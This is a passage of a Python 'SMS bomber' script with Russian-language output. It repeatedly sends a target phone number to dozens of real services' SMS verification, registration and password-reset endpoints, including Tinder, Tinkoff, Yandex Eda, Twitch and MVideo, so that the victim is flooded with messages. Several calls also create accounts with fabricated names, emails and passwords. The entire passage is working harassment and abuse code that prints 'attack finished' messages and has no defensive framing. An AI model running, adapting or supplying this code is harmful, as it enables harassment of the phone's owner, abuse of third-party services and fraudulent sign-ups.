            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                                "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
